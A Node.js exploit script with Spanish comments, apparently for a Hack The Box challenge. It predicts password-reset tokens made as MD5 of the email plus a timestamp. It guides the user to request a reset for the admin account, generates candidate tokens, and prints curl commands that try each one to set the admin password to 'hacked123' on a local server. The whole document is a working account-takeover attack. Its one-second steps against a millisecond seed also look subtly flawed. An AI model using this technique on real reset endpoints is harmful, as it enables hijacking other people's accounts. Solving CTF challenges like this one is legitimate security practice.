// exploit.js - Script para explotar el token predictable
const crypto = require('crypto');

// Funci√≥n para generar el token como lo hace el servidor
function generateToken(email, timestamp) {
    const seed = email + timestamp.toString();
    return crypto.createHash('md5').update(seed).digest('hex');
}

// Funci√≥n principal del exploit
function generateExploit() {
    const email = 'admin@hackthebox.com';
    
    console.log('='.repeat(70));
    console.log('üéØ HACK THE BOX - PREDICTABLE RESET TOKEN EXPLOIT');
    console.log('='.repeat(70));
    console.log('');
    
    console.log('üìã INSTRUCCIONES:');
    console.log('1. Copia el comando curl de abajo');
    console.log('2. √Åbrelo en una nueva ventana de cmd/PowerShell');
    console.log('3. Ejecuta el comando INMEDIATAMENTE despu√©s de copiarlo');
    console.log('4. Vuelve aqu√≠ y presiona ENTER cuando hayas ejecutado el curl');
    console.log('');
    
    console.log('üöÄ COMANDO PARA SOLICITAR RESET TOKEN:');
    console.log('-'.repeat(50));
    console.log('curl -X POST http://localhost:1337/api/forgot-password -H "Content-Type: application/json" -d "{\\"email\\":\\"admin@hackthebox.com\\"}"');
    console.log('-'.repeat(50));
    console.log('');
    
    // Esperar input del usuario
    const readline = require('readline');
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    rl.question('‚úÖ Presiona ENTER despu√©s de ejecutar el comando curl...', (answer) => {
        console.log('');
        console.log('‚è∞ Generando tokens posibles...');
        
        // Generar tokens alrededor del tiempo actual
        const now = Date.now();
        const tokens = [];
        
        // Rango de 60 segundos hacia atr√°s (para cubrir el tiempo desde que ejecutaste curl)
        for (let i = -60; i <= 10; i++) {
            const timestamp = now + (i * 1000);
            const token = generateToken(email, timestamp);
            tokens.push({
                offset: i,
                token: token,
                timestamp: timestamp
            });
        }
        
        console.log(`üí° Generados ${tokens.length} tokens posibles`);
        console.log('');
        console.log('üî® COMANDOS PARA PROBAR TOKENS:');
        console.log('='.repeat(70));
        console.log('Copia y ejecuta cada comando hasta que uno funcione:');
        console.log('');
        
        tokens.forEach((tokenData, index) => {
            if (index % 10 === 0) {
                console.log(`--- Grupo ${Math.floor(index/10) + 1} (tokens ${index + 1}-${Math.min(index + 10, tokens.length)}) ---`);
            }
            console.log(`curl -X POST http://localhost:1337/api/reset-password -H "Content-Type: application/json" -d "{\\"email\\":\\"admin@hackthebox.com\\",\\"token\\":\\"${tokenData.token}\\",\\"newPassword\\":\\"hacked123\\"}"`);
        });
        
        console.log('');
        console.log('='.repeat(70));
        console.log('üéâ CUANDO ENCUENTRES EL TOKEN CORRECTO:');
        console.log('   Email: admin@hackthebox.com');
        console.log('   Password: hacked123');
        console.log('üåê Ve a: http://localhost:1337/login');
        console.log('='.repeat(70));
        
        rl.close();
    });
}

// Ejecutar el exploit
generateExploit();